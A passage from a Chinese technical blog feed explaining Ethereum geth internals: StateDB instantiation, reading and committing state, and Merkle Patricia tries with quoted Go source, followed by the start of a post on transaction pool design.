内存</strong>中，并未真正的写入数据库文件。 <strong>执行 Commit</strong>，才会<strong>将关于 statadb 的所有变更更新到数据库文件</strong>中。</li><li>❽ 一旦提交数据，则可以使用 Dump 命令从数据库中查找此 stata 相关的所有数据，包括所有账户。 并<strong>以 JSON 格式返还</strong>。这里，我们将返还结果直接打印输出。</li></ul><p>代码执行输出结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;3a25b0816cf007c0b878ca7a62ba35ee0337fa53703f281c41a791a137519f00&quot;</span>,<br>  <span class="hljs-attr">&quot;accounts&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;0bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;balance&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>,<br>      <span class="hljs-attr">&quot;nonce&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>,<br>      <span class="hljs-attr">&quot;codeHash&quot;</span>: <span class="hljs-string">&quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;</span>,<br>      <span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;storage&quot;</span>: &#123;&#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;77de172a492c40217e48ebb7eeff9b2d7df8151b&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;balance&quot;</span>: <span class="hljs-string">&quot;888&quot;</span>,<br>      <span class="hljs-attr">&quot;nonce&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>,<br>      <span class="hljs-attr">&quot;codeHash&quot;</span>: <span class="hljs-string">&quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;</span>,<br>      <span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;storage&quot;</span>: &#123;&#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;80580f576731dc1e1dcc53d80b261e228c447cdd&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;balance&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>      <span class="hljs-attr">&quot;nonce&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;1f6d937817f2ac217d8b123c4983c45141e50bd0c358c07f3c19c7b526dd4267&quot;</span>,<br>      <span class="hljs-attr">&quot;codeHash&quot;</span>: <span class="hljs-string">&quot;c668dac8131a99c411450ba912234439ace20d1cc1084f8e198fee0a334bc592&quot;</span>,<br>      <span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-string">&quot;636f6e747261637420636f6465206279746573&quot;</span>,<br>      <span class="hljs-attr">&quot;storage&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;000000000000000000000000000000000000000000000000000000006e616d65&quot;</span>: <span class="hljs-string">&quot;8479737169&quot;</span>,<br>        <span class="hljs-attr">&quot;0000000000000000000000000000000000000000000000000000006f776e6572&quot;</span>: <span class="hljs-string">&quot;940bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链底层-存储</title>
      <link href="/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8/"/>
      <url>/2021/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8/</url>
      
        <content type="html"><![CDATA[<p>本文聚焦区块链底层技术–存储技术。主要包含世界状态、账户状态和 MPT 树。<br>参考：<a href="https://learnblockchain.cn/books/geth/part3/statedb.html">https://learnblockchain.cn/books/geth/part3/statedb.html</a></p><a id="more"></a><h1 id="StateDB-世界状态"><a href="#StateDB-世界状态" class="headerlink" title="StateDB-世界状态"></a>StateDB-世界状态</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618575710431-5b3c9d14-5230-49a7-95d4-045bca35bd54.png#clientId=u34e3a6f1-8d42-4&from=paste&height=136&id=u29593524&originHeight=174&originWidth=955&originalType=url&status=done&style=none&taskId=ud67f5524-9e0a-474e-8ebf-a18abeb618d&width=747.5"><br>从程序设计角度，StateDB 有多种用途：</p><ol><li>维护账户状态到世界状态的映射。</li><li>支持修改、回滚、提交状态。</li><li>支持持久化状态到数据库中。</li><li>是状态进出默克尔树的媒介。</li></ol><p>实际上** StateDB <strong>充当</strong>状态（数据）<strong>、</strong>Trie(树)<strong>、</strong>LevelDB（存储）**的协调者。</p><h2 id="实例化-StateDB"><a href="#实例化-StateDB" class="headerlink" title="实例化 StateDB"></a>实例化 StateDB</h2><p>在对状态的任何操作前，我们要先构建一个 StateDB 来操作状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">db: = state.NewDatabase(levelDB)<br>statedb, err := state.New(block.Root(), db)<br></code></pre></td></tr></table></figure><p>首先，我们要告诉 StateDB ，我们要使用哪个状态。因此<strong>需要提供 StateRoot 作为默克尔树根去构建树</strong>。StateRoot 值相当于数据版本号，根据版本号可以明确的知道要使用使用哪个版本的状态。当然，数据内容并没在树中，<strong>需要到一个数据库中读取</strong>。因此在构建 State DB 时需要提供 stateRoot 和 db 才能完成构建。<br>任何实现 state.Database 接口的 db 都可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/database.go:42</span><br><span class="hljs-keyword">type</span> Database <span class="hljs-keyword">interface</span> &#123;<br>OpenTrie(root common.Hash) (Trie, error)<br>OpenStorageTrie(addrHash, root common.Hash) (Trie, error)<br>CopyTrie(Trie) Trie<br>ContractCode(addrHash, codeHash common.Hash) ([]<span class="hljs-keyword">byte</span>, error)<br>ContractCodeSize(addrHash, codeHash common.Hash) (<span class="hljs-keyword">int</span>, error)<br><br><span class="hljs-comment">// TrieDB retrieves the low level trie database used for data storage.</span><br>TrieDB() *trie.Database<br>&#125;<br></code></pre></td></tr></table></figure><p>通过 db 可以访问：</p><ol><li>OpenTrie: 打开指定状态版本(root)的含世界状态的顶层树。</li><li>OpenStorageTrie: <strong>打开账户(addrHash)下</strong>指定状态版本(root)的<strong>账户数据存储树</strong>。</li><li>CopyTrie: 深度拷贝树。</li><li>ContractCode：获取账户（addrHash）的合约，必须和合约哈希(codeHash)匹配。</li><li>ContractCodeSize 获取指定合约大小</li><li>TrieDB：<strong>获得 Trie 底层的数据驱动 DB</strong>，如:** levedDB** 、<strong>内存数据库</strong>、远程数据库</li></ol><p>当前有两种类型的 DB 实现了 Database 接口，轻节点使用的 odrDatabase ，和正常节点端使用的带有缓存的 cachingDB 。 因为轻节点并不存储数据，需要通过向其他节点查询来获得数据，而 odrDatabase 就是这种数据读取方式的封装。一个普通节点已内置 levelDB，为了提高读写性能，使用 cachingDB 对其进行一次封装。<br>在实例化 StateDB 时，需要立即打开含有世界状态的 Trie 树。如果 root 对应的树不存在，则会实例化失败 ①。实例化的 StateDB 中将记录多种信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/state/statedb.go:59</span><br><span class="hljs-keyword">type</span> StateDB <span class="hljs-keyword">struct</span> &#123;<br>db   Database<br>trie Trie<br>stateObjects      <span class="hljs-keyword">map</span>[common.Address]*stateObject<br>stateObjectsDirty <span class="hljs-keyword">map</span>[common.Address]<span class="hljs-keyword">struct</span>&#123;&#125;<br>dbErr error<br>refund <span class="hljs-keyword">uint64</span><br><br>thash, bhash common.Hash<br>txIndex      <span class="hljs-keyword">int</span><br>logs         <span class="hljs-keyword">map</span>[common.Hash][]*types.Log<br>logSize      <span class="hljs-keyword">uint</span><br><br>preimages <span class="hljs-keyword">map</span>[common.Hash][]<span class="hljs-keyword">byte</span><br>journal        *journal<br>validRevisions []revision<br>nextRevisionId <span class="hljs-keyword">int</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>db: 操作状态的<strong>底层数据库</strong>，在实例化 StateDB 时指定 ②。</li><li>trie: 世界状态所在的树实例对象，现在只有以太坊改进的默克尔前缀压缩树。</li><li>stateObjects: <strong>已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</strong>。</li><li>stateObjectsDirty： 标记被修改过的账户。</li><li>journal： 是修改状态的日志流水，使用此日志流水可回滚状态。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/state/statedb.go:92</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(root common.Hash, db Database)</span> <span class="hljs-params">(*StateDB, error)</span></span> &#123;<br>tr, err := db.OpenTrie(root)<span class="hljs-comment">//①</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;StateDB&#123;<br>db:                db,<span class="hljs-comment">//②</span><br>trie:              tr,<br>stateObjects:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Address]*stateObject),<br>stateObjectsDirty: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Address]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>logs:              <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Hash][]*types.Log),<br>preimages:         <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Hash][]<span class="hljs-keyword">byte</span>),<br>journal:           newJournal(),<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面对的代码实例化了一个 statedb。</p><h2 id="读写-StateDB-状态"><a href="#读写-StateDB-状态" class="headerlink" title="读写 StateDB 状态"></a>读写 StateDB 状态</h2><p>你所访问的任何数据必然属于某个账户下的状态，世界状态态仅仅是通过一颗树来建立安全的映射。因此你所访问的数据可以分为如下几种类型：</p><ol><li>访问账户基础属性：Balance、Nonce、Root、CodeHash</li><li>读取合约账户代码</li><li>读取合约账户中存储内容</li></ol><p>在代码实现中，为了便于账户隔离管理，使用不开放的 stateObject 来维护。 stateObject 注意代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> stateObject <span class="hljs-keyword">struct</span> &#123;<br>address  common.Address<span class="hljs-comment">//对应的账户地址</span><br>addrHash common.Hash <span class="hljs-comment">// 账户地址的哈希值</span><br>data     Account <span class="hljs-comment">//账户属性</span><br>db       *StateDB <span class="hljs-comment">//底层数据库</span><br><br>    <span class="hljs-comment">//...</span><br><span class="hljs-comment">// 写缓存</span><br>trie Trie <span class="hljs-comment">// 存储树，第一次访问时初始化</span><br>code Code <span class="hljs-comment">// contract bytecode, which gets set when code is loaded</span><br>    <span class="hljs-comment">//...</span><br>&#125;<br><span class="hljs-keyword">type</span> Account <span class="hljs-keyword">struct</span> &#123;<br>Nonce    <span class="hljs-keyword">uint64</span><br>Balance  *big.Int<br>Root     common.Hash <span class="hljs-comment">// merkle root of the storage trie</span><br>CodeHash []<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、账户属性、底层数据库、存储树等内容。<br>当你访问状态时，需要指定账户地址。比如获取账户合约，合约账户代码，均是通过账户地址，获得获得对应的账户的 stateObject。因此，当你访问某账户余额时，需要从世界状态树 Trie 中读取账户状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/statedb.go:408</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(self *StateDB)</span> <span class="hljs-title">getStateObject</span><span class="hljs-params">(addr common.Address)</span> <span class="hljs-params">(stateObject *stateObject)</span></span> &#123;<br><span class="hljs-keyword">if</span> obj := self.stateObjects[addr]; obj != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//①</span><br><span class="hljs-keyword">if</span> obj.deleted &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> obj<br>&#125;<br><br>enc, err := self.trie.TryGet(addr[:])<span class="hljs-comment">//②</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(enc) == <span class="hljs-number">0</span> &#123;<br>self.setError(err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">var</span> data Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(enc, &amp;data); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//③</span><br>log.Error(<span class="hljs-string">&quot;Failed to decode state object&quot;</span>, <span class="hljs-string">&quot;addr&quot;</span>, addr, <span class="hljs-string">&quot;err&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>obj := newObject(self, addr, data)<span class="hljs-comment">//④</span><br>self.setStateObject(obj)<br><span class="hljs-keyword">return</span> obj<br>&#125;<br></code></pre></td></tr></table></figure><p>state.getStateObject(addr)方法，将返回指定账户的 StateObject，不存在时 nil。<br>state 的 stateObject Map 中记录这从实例化 State 到当下，所有访问过的账户的 StateObject。 因此，获取 StateObject 时先从 map 缓存中检查是否已打开 ①，如果存在则返回。** 如果是第一次使用，则以账户地址为 key 从树中查找读取账户状态数据<strong>②。读取到的数据，是被 RLP 序列化过的，因此，在读取到数据后，还需要进行反序列化 ③。为了降低 IO 和在内存中维护可能被修改的 Account 信息，会将其组装成 **StateObjec ④ 存储在 State 实例</strong>中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/state/state_object.go:108</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newObject</span><span class="hljs-params">(db *StateDB, address common.Address, data Account)</span> *<span class="hljs-title">stateObject</span></span> &#123;<br><span class="hljs-keyword">if</span> data.Balance == <span class="hljs-literal">nil</span> &#123;<br>data.Balance = <span class="hljs-built_in">new</span>(big.Int)<br>&#125;<br><span class="hljs-keyword">if</span> data.CodeHash == <span class="hljs-literal">nil</span> &#123;<br>data.CodeHash = emptyCodeHash<br>&#125;<br><span class="hljs-keyword">return</span> &amp;stateObject&#123;<br>db:            db,<br>address:       address,<br>addrHash:      crypto.Keccak256Hash(address[:]),<span class="hljs-comment">//⑤</span><br>data:          data,<br>originStorage: <span class="hljs-built_in">make</span>(Storage),<br>dirtyStorage:  <span class="hljs-built_in">make</span>(Storage),<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>newObject 就是将对 Account 的操作进行辅助，其中记录了账户地址、地址哈希 ⑤ 等内容，最终你读写状态都经过 stateObject 完成。</p><h2 id="StateDB-完成持久化"><a href="#StateDB-完成持久化" class="headerlink" title="StateDB 完成持久化"></a>StateDB 完成持久化</h2><p>在区块中，将交易作为输入条件，来根据一系列动作修改状态。<br>在完成区块挖矿前，只是获得在内存中的状态树的 Root 值。 StateDB 可视为一个内存数据库，状态数据先在内存数据库中完成修改，所有关于状态的计算都在内存中完成。 在将区块持久化时完成有内存到数据库的更新存储，此更新属于增量更新，仅仅修改涉及到被修改部分。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/statedb.go:680</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *StateDB)</span> <span class="hljs-title">Commit</span><span class="hljs-params">(deleteEmptyObjects <span class="hljs-keyword">bool</span>)</span> <span class="hljs-params">(root common.Hash, err error)</span></span> &#123;<br><span class="hljs-keyword">defer</span> s.clearJournalAndRefund()<br><br><span class="hljs-keyword">for</span> addr := <span class="hljs-keyword">range</span> s.journal.dirties &#123;<span class="hljs-comment">//①⑧⑨⑩</span><br>s.stateObjectsDirty[addr] = <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>&#125;<br><span class="hljs-keyword">for</span> addr, stateObject := <span class="hljs-keyword">range</span> s.stateObjects &#123;<span class="hljs-comment">//②</span><br>_, isDirty := s.stateObjectsDirty[addr]<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> stateObject.suicided || (isDirty &amp;&amp; deleteEmptyObjects &amp;&amp; stateObject.empty()):<br><span class="hljs-comment">//③</span><br>s.deleteStateObject(stateObject)<br><span class="hljs-keyword">case</span> isDirty:<br><span class="hljs-keyword">if</span> stateObject.code != <span class="hljs-literal">nil</span> &amp;&amp; stateObject.dirtyCode &#123;<span class="hljs-comment">//④</span><br>s.db.TrieDB().InsertBlob(common.BytesToHash(stateObject.CodeHash()), stateObject.code)<br>stateObject.dirtyCode = <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">if</span> err := stateObject.CommitTrie(s.db); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//⑤</span><br><span class="hljs-keyword">return</span> common.Hash&#123;&#125;, err<br>&#125;<br>s.updateStateObject(stateObject)<span class="hljs-comment">//⑥</span><br>&#125;<br><span class="hljs-built_in">delete</span>(s.stateObjectsDirty, addr)<br>&#125;<br><span class="hljs-comment">//...</span><br>root, err = s.trie.Commit(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(leaf []<span class="hljs-keyword">byte</span>, parent common.Hash)</span> <span class="hljs-title">error</span></span> &#123;<span class="hljs-comment">//⑦</span><br><span class="hljs-keyword">var</span> account Account<br><span class="hljs-keyword">if</span> err := rlp.DecodeBytes(leaf, &amp;account); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> account.Root != emptyRoot &#123;<br>s.db.TrieDB().Reference(account.Root, parent)<br>&#125;<br>code := common.BytesToHash(account.CodeHash)<br><span class="hljs-keyword">if</span> code != emptyCode &#123;<br>s.db.TrieDB().Reference(code, parent)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> root, err<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618664027914-80262f2e-9aaf-460f-9d7e-0452241d3a9c.png#clientId=u34e3a6f1-8d42-4&from=paste&height=506&id=ufcde743f&originHeight=1012&originWidth=936&originalType=url&status=done&style=none&taskId=u9036f292-bba3-41a2-a09a-3566a7f7e94&width=468"><br>如上图所示，上半部分均属于内存操作，仅仅在 stateDB.Commit()时才将状态通过树提交到 leveldb 中。</p><h1 id="MPT-默克尔压缩前缀树"><a href="#MPT-默克尔压缩前缀树" class="headerlink" title="MPT-默克尔压缩前缀树"></a>MPT-默克尔压缩前缀树</h1><p>是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。一个非叶节点存储在 leveldb 关系型数据库中，数据库中的 key 是节点的 RLP 编码的 sha3 哈希，value 是节点的 RLP 编码。想要获得一个非叶节点的子节点，只需要根据子节点的 hash 访问数据库获得节点的 RLP 编码，然后解码就行了。<br>以太坊有四种前缀树：</p><ol><li><strong>世界状态树包括了从地址到账户状态之间的映射。</strong> 世界状态树的根节点哈希值由区块保存（在 stateRoot 字段），它标示了区块创建时的当前状态。<strong>整个网络中只有一个世界状态树。</strong></li><li><strong>账户存储树保存了与某一智能合约相关的数据信息。</strong>由账户状态保存账户存储树的根节点哈希值（在 storageRoot 字段）。<strong>每个账户都有一个账户存储树。</strong></li><li><strong>交易树包含了一个区块中的所有交易信息。</strong>由区块头（在 transactionsRoot 区域）保存交易树的根节点哈希值。<strong>每个区块都有一棵交易树。</strong></li><li><strong>交易收据树包含了一个区块中所有交易的收据信息。</strong>同样由区块头（在 receiptsRoot 区域）保存交易收据树的根节点哈希值；<strong>每个区块都有对应的交易收据树。</strong></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>交易内存池底层实现</title>
      <link href="/2021/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/%E4%BA%A4%E6%98%93%E5%86%85%E5%AD%98%E6%B1%A0%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>既然要从头搭建一个区块链网络，交易池是绕不开的一个核心底层。对于它，以下几个问题是需要解决的：</p><ol><li>用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；</li><li>产生的交易如果不能被及时处理，是如何进入交易池的；</li><li>本地产生的交易和从网络中接收到的交易进入交易池是否有区别；</li><li>交易池的基本数据结构是怎么样的（优先队列？）</li><li>从交易池中提取交易进行打包时顺序是怎么样的（调度算法）<blockquote><p>网络中很多文章提到内存池，指的就是是 txpool</p></blockquote></li></ol><a id="more"></a><h1 id="交易形成"><a href="#交易形成" class="headerlink" title="交易形成"></a>交易形成</h1><p>以下均为作品赛项目的内容。<br>首先，我们的交易请求会赋值到 TxRaw 结构体的一个实例中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//用于接收客户端发来的序列化post原始信息</span><br><span class="hljs-keyword">type</span> TxRaw <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">//公钥hash</span><br>Address []<span class="hljs-keyword">byte</span> <span class="hljs-string">`json:&quot;address&quot;`</span><br><br>Fee <span class="hljs-keyword">int</span> <span class="hljs-string">`json:&quot;int&quot;`</span><br><br><span class="hljs-comment">//交易核心</span><br>RangeBloom bloom.RangeBloom <span class="hljs-string">`json:&quot;rbloom&quot;`</span><br>TimeBloom  bloom.TimeBloom  <span class="hljs-string">`json:&quot;tbloom&quot;`</span><br><br><span class="hljs-comment">//签名相关</span><br>Pubkey sm2.PublicKey <span class="hljs-string">`json:&quot;pubkey&quot;`</span><br>Sign   []<span class="hljs-keyword">byte</span>        <span class="hljs-string">`json:&quot;sign&quot;`</span><br><br><span class="hljs-comment">//交易同态密文拼接，用于k-top查找</span><br>Cipher <span class="hljs-keyword">string</span> <span class="hljs-string">`json:&quot;cipher&quot;`</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后这个实例被传递到一个 SendTransaction 函数，用来创建一个交易 Tx。创建交易的过程如下：</p><ol><li>根据 Address 字段找到当前账户</li><li>设置交易默认参数</li><li>检查交易签名是否合法</li><li>检查交易是否冲突</li><li>对交易进行序列化，变为可存储和传输的形式。</li><li>提交交易到交易池</li></ol><h1 id="交易管理"><a href="#交易管理" class="headerlink" title="交易管理"></a>交易管理</h1><p>以太坊将交易按状态分为两部分：<strong>可执行交易</strong>和<strong>非可执行交易</strong>。分别记录在 pending 容器中和 queue 容器中。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618542865374-f0325b19-9838-4ec6-95b4-307a899962bd.png#clientId=u272c35f2-3d2a-4&from=paste&height=321&id=u5bf56761&originHeight=538&originWidth=1160&originalType=binary&size=164987&status=done&style=none&taskId=u567ff6dc-553f-4a1c-af77-71fc9a19a73&width=693"><br>如上图所示，交易池先采用一个 txLookup (内部为 map）跟踪所有交易。同时将交易根据本地优先，价格优先原则将交易划分为两部分 queue 和 pending。而这两部交易则按账户分别跟踪。<br>为了不丢失未完成的本地交易，以太坊交易池通过 journal 文件存储和管理当前交易池中的本地交易，并定期更新存储。<br>下图是<strong>交易池对本地待处理交易的磁盘存储管理流程</strong>，涉及加载、实时写入和定期更新维护。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618543666828-ac2e3e32-c72f-4e7c-a240-b7bc1452cdcb.png#clientId=u272c35f2-3d2a-4&from=paste&height=826&id=ufc47fc0d&originHeight=1356&originWidth=870&originalType=url&status=done&style=none&taskId=ubb8c227e-5868-49f4-b1ea-77abbe42349&width=530"></p><h2 id="存储交易"><a href="#存储交易" class="headerlink" title="存储交易"></a>存储交易</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618555946782-660f2f04-fbb0-4010-a9a6-c1097a44d0e2.png#clientId=u272c35f2-3d2a-4&from=paste&height=317&id=uc114cf13&originHeight=432&originWidth=826&originalType=url&status=done&style=none&taskId=u8fb70d54-24fd-45a9-880e-9b7951920f0&width=606"><br>当交易池新交易来自于本地账户时 ❶，如果已开启记录本地交易，则将此交易加入 journal ❷。到交易池时，将实时存储到 journal 文件中。</p><figure class="highlight go"><table><tr><td 